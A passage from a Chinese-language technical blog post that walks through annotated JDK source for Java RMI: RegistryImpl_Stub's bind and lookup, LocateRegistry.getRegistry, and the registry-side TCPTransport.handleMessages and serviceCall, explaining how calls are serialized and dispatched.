(clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            logClientCall(obj, ops[opnum]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 StreamRemoteCall 对象，表示远程调用</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), opnum, hash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 序列化自定义调用数据</span></span><br><span class="line">            marshalCustomCallData(call.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 如果序列化时出错，抛出 MarshalException 异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshaling &quot;</span> +</span><br><span class="line">                                       <span class="string">&quot;custom call data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回远程调用对象</span></span><br><span class="line">        <span class="keyword">return</span> call;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// 如果远程异常发生，释放连接并重新抛出异常</span></span><br><span class="line">        ref.getChannel().free(conn, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>StreamRemoteCall</code> 创建远程调用对象时会写入如下内容用以为被调用方提供方法调用的相关信息。</p>
<ul>
<li>操作码 <code>opnum</code>（<code>bind/0</code>，<code>list/1</code>，<code>lookup/2</code> 对应不同的 <code>opnum</code>），</li>
<li>对象 id（<code>ref.getObjID()</code>，用来描述对象类型）<ul>
<li>对于 <code>RegistryImpl_Stub</code>，这里就是 0。</li>
<li>对于普通远程对象的动态代理 <code>Stub</code>，这里就是其对应的 id。</li>
</ul>
</li>
</ul>
<p>之后在 <code>RegistryImpl_Stub#bind</code> 会将远程对象及其名称序列化后写入输出流，最后调用<code>UnicastRef</code>的 <code>invoke</code> 方法（<code>invoke</code> 会调用 <code>StreamRemoteCall#executeCall</code>，释放输出流，调用远程方法，将结果写进输入流）传给注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取输出流并将参数序列化到流中</span></span><br><span class="line">java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">out.writeObject($param_String_1);  <span class="comment">// 写入名称参数</span></span><br><span class="line">out.writeObject($param_Remote_2);  <span class="comment">// 写入远程对象参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用远程方法</span></span><br><span class="line">ref.invoke(call);</span><br><span class="line"><span class="comment">// 完成远程调用</span></span><br><span class="line">ref.done(call);</span><br></pre></td></tr></table></figure></div>

<p>总结一下将远程对象注册到服务中心时的关键点：</p>
<ul>
<li>一般注册中心和服务端都在一起，可直接调用 <code>createRegistry</code> 返回的<code>RegistryImpl#bind</code>，也可以用 <code>Naming#bind</code>。</li>
<li><code>Naming#bind</code> 是通过 <code>RegistryImpl_Stub</code> 将服务名称和远程对象的动态代理 Stub 序列化后传递给注册中心，注册中心再进行 <code>RegistryImpl#bind</code>。</li>
</ul>
<h3 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h3><p>服务发现，就是获取注册中心并对其进行操作的过程。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>关于服务发现，对于服务端来说：</p>
<ul>
<li><p>当服务端和注册中心不在同一端的时候，服务端也会使用 <code>Naming#bind</code> 静态方法注册远程对象。</p>
</li>
<li><p>如果服务端和注册中心在同一端，则可以直接使用创建的注册中心对象 <code>RegistryImpl</code> 的 <code>bind</code> 方法直接将远程对象注册到注册中心。</p>
</li>
</ul>
<p>其中第一种情况其本质是通过 <code>getRegistry</code> 方法获取注册中心，然后再将远程对注册到注册中心中。 这个过程就是服务发现。</p>
<p>而对于客户端，我们调用远程方法之前的第一件事情就是调用 <code>getRegistry</code> 方法获取注册中心，因此同样会涉及服务发现。</p>

    </div>
  </div>

<h4 id="客户端-服务端部分"><a href="#客户端-服务端部分" class="headerlink" title="客户端&#x2F;服务端部分"></a>客户端&#x2F;服务端部分</h4><p>首先是获取注册中心：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>getRegistry</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回指定主机和端口的远程对象 Registry 的本地引用（存根）。</span></span><br><span class="line"><span class="comment"> * 与该远程注册表的通信将使用提供的 RMIClientSocketFactory（csf）</span></span><br><span class="line"><span class="comment"> * 来创建连接到远程主机和端口的 Socket 连接。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> host 远程注册表的主机</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 注册表接受请求的端口号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> csf 客户端的 Socket 工厂，用于创建与注册表的连接。</span></span><br><span class="line"><span class="comment"> *            如果 csf 为 null，则使用默认的客户端 Socket 工厂。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程注册表的引用（存根）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果无法创建引用，抛出此异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                   RMIClientSocketFactory csf)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果端口小于等于 0，使用默认注册表端口</span></span><br><span class="line">    <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">        port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果主机为空，则尝试获取本地的 IP 地址</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试获取本地机器的 IP 地址</span></span><br><span class="line">            host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 如果获取失败，至少尝试 &quot;&quot;（localhost）</span></span><br><span class="line">            host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 使用给定的主机、端口和客户端 Socket 工厂创建注册表的代理。</span></span><br><span class="line"><span class="comment">     * 如果提供的客户端 Socket 工厂为 null，则使用 UnicastRef；</span></span><br><span class="line"><span class="comment">     * 否则，使用 UnicastRef2。</span></span><br><span class="line"><span class="comment">     * 如果属性 java.rmi.server.ignoreStubClasses 为 true，</span></span><br><span class="line"><span class="comment">     * 返回的代理是动态代理类的实例，否则返回 RegistryImpl 的预生成存根类的实例。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                    <span class="literal">false</span>);</span><br><span class="line">    <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">        (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 Registry 接口的代理对象</span></span><br><span class="line">    <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回指定主机和端口的远程对象 Registry 的引用。</span></span><br><span class="line"><span class="comment"> * 如果 host 为 null，则使用本地主机。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> host 远程注册表的主机</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 注册表接受请求的端口号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程注册表的引用（存根）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果无法创建引用，抛出此异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用上面的方法，但不传递客户端 Socket 工厂（即使用默认工厂）</span></span><br><span class="line">    <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中核心过程为：</p>
<ol>
<li>通过传入的 <code>host</code> 和 <code>port</code> 创建一个 <code>LiveRef</code> 用于网络请求（注意这里传入的 <code>ObjID</code> 也是 0），并通过 <code>UnicastRef</code> 进行封装。</li>
<li>然后和注册中心的逻辑相同，尝试创建代理，这里同样获取了一个 <code>RegistryImpl_Stub</code> 对象。</li>
</ol>
<p>接着在客户端，我们通过 <code>lookup</code> 与注册中心通信，查找远程对象获取存根。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Stub#lookup</code> 函数代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lookup(String) 方法的实现</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.Remote <span class="title function_">lookup</span><span class="params">(java.lang.String $param_String_1)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个远程调用对象</span></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall) ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输出流并将名称参数写入流中</span></span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_String_1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 如果序列化参数时出错，抛出 MarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line">        java.rmi.Remote $result;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输入流并反序列化返回的远程对象</span></span><br><span class="line">            java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">            $result = (java.rmi.Remote) in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 完成调用</span></span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回远程对象</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>与前面 <code>RegistryImpl_Stub#bind</code> 类似：</p>
<ol>
<li><code>RegistryImpl_Stub#lookup</code> 同样会调用 <code>newCall</code> 建立与远程注册中心的连接。</li>
<li>然后再通过序列化将要查找的名称写入输出流。</li>
<li>之后调用调用 <code>UnicastRef</code> 的 <code>invoke</code> 方法将序列化的名称传给远程的注册中心。</li>
<li>最后获取输入流，将返回值进行反序列化，得到远程对象的动态代理 Stub。</li>
</ol>
<p>最后总结一下，就是：</p>
<ul>
<li><code>LocateRegistry.getRegistry</code> 用于获取注册中心的 Stub，即 <code>RegistryImpl_Stub</code>，过程和注册中心的创建一样，都是调用 <code>Util#createProxy</code>。</li>
<li>注册中心实际上相当于一个客户端知道其端口号的远程对象。</li>
<li><code>RegistryImpl_Stub#lookup</code> 首先建立与注册中心的连接，服务名称序列化后写入输出流，释放输出流，等待远程返回，获取输入流进行反序列化，得到远程对象的动态代理Stub。</li>
</ul>
<h4 id="注册中心部分"><a href="#注册中心部分" class="headerlink" title="注册中心部分"></a>注册中心部分</h4><p>注册中心由 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 来处理请求。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * handleMessages 解码传输操作并适当地处理消息。</span></span><br><span class="line"><span class="comment"> * 如果在处理消息时发生异常，连接的套接字将被关闭。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">handleMessages</span><span class="params">(Connection conn, <span class="type">boolean</span> persistent)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> getEndpoint().getPort();  <span class="comment">// 获取端口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建数据输入流，用于从连接中读取数据</span></span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();  <span class="comment">// 读取传输操作（操作码）</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据操作码执行不同的处理</span></span><br><span class="line">            <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">                    <span class="comment">// 处理传入的 RMI 调用</span></span><br><span class="line">                    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line">                    <span class="keyword">if</span> (serviceCall(call) == <span class="literal">false</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Ping:</span><br><span class="line">                    <span class="comment">// 发送 Ping 响应</span></span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(conn.getOutputStream());</span><br><span class="line">                    out.writeByte(TransportConstants.PingAck);  <span class="comment">// 写入 Ping 响应</span></span><br><span class="line">                    conn.releaseOutputStream();  <span class="comment">// 释放输出流</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.DGCAck:</span><br><span class="line">                    <span class="comment">// 处理 DGCAck 操作</span></span><br><span class="line">                    DGCAckHandler.received(UID.read(in));  <span class="comment">// 读取 UID 并处理</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 如果操作码不匹配，抛出 IOException</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;unknown transport op &quot;</span> + op);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (persistent);  <span class="comment">// 如果是持久连接，继续处理</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>handleMessages</code> 会根据数据流的第一个操作数数值决定如何处理数据，这里主要是 <code>Call</code> 操作。对于 <code>Call</code> 操作，这里会创建一个 <code>StreamRemoteCall</code>（和客户端一样），然后调用 <code>serviceCall</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">    <span class="comment">// 处理传入的 RMI 调用</span></span><br><span class="line">    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line">    <span class="keyword">if</span> (serviceCall(call) == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>serviceCall</code> 函数代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理传入的远程调用。当连接中到达消息，指示开始进行远程调用时，线程需要</span></span><br><span class="line"><span class="comment"> * 调用其传输层的 &lt;I&gt;serviceCall&lt;/I&gt; 方法。该方法的默认实现查找并调用分发器对象。</span></span><br><span class="line"><span class="comment"> * 通常，传输实现不需要重写此方法。在调用 &lt;I&gt;tr.serviceCall(conn)&lt;/I&gt; 时，连接的</span></span><br><span class="line"><span class="comment"> * 输入流已定位到传入消息的开始位置。&lt;I&gt;serviceCall&lt;/I&gt; 方法处理传入的远程调用，</span></span><br><span class="line"><span class="comment"> * 并将结果通过连接的输出流发送。如果返回 &quot;true&quot;，则表示远程调用已成功处理，</span></span><br><span class="line"><span class="comment"> * 传输层可以缓存连接；如果返回 &quot;false&quot;，则表示调用期间发生了协议错误，</span></span><br><span class="line"><span class="comment"> * 传输层应该销毁连接。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall call)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/* 读取对象 ID */</span></span><br><span class="line">        <span class="keyword">final</span> Remote impl;</span><br><span class="line">        ObjID id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 从输入流中读取对象 ID</span></span><br><span class="line">            id = ObjID.read(call.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 如果读取对象 ID 出错，抛出 MarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 获取远程对象 */</span></span><br><span class="line">        <span class="type">Transport</span> <span class="variable">transport</span> <span class="operator">=</span> id.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;  <span class="comment">// 如果 ID 等于 dgcID，则为 null</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(id, transport));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="literal">null</span> || (impl = target.getImpl()) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果目标不存在或远程对象实现为 null，抛出 NoSuchObjectException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">disp</span> <span class="operator">=</span> target.getDispatcher();</span><br><span class="line">        target.incrementCallCount();  <span class="comment">// 增加调用计数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* 调用分发器 */</span></span><br><span class="line">            transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> target.getAccessControlContext();</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> target.getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取当前线程的上下文类加载器</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                setContextClassLoader(ccl);  <span class="comment">// 设置目标的类加载器</span></span><br><span class="line">                currentTransport.set(<span class="built_in">this</span>);  <span class="comment">// 设置当前的传输对象</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.security.AccessController.doPrivileged(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span 